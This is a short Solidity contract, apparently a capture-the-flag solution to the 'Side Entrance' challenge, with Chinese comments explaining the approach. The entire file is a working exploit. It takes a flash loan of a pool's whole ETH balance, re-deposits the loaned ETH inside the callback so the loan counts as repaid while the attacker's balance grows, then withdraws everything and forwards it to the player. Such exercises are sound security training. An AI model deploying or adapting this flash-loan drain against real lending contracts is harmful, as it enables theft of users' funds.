// SPDX-License-Identifier: MIT
//这个存的是ETH，所以我们不能用approve来进行攻击了
//这个使用的是在闪电贷当中去触发deposit()函数来增加mapping，最后提取出来
//上传test
pragma solidity ^0.8.0;


interface IPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract AttackSideEntrance {
    IPool immutable pool;
    address immutable player;
    constructor(address _pool,address _player){
        pool = IPool(_pool);
        player = _player;
    }
    function attack() external{
        pool.flashLoan(address(pool).balance);
        pool.withdraw(); 
        (bool success,)=player.call{value: address(this).balance}("");
    }
    function execute() external payable{
        require(tx.origin ==player);
        require(msg.sender ==address(pool));
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}
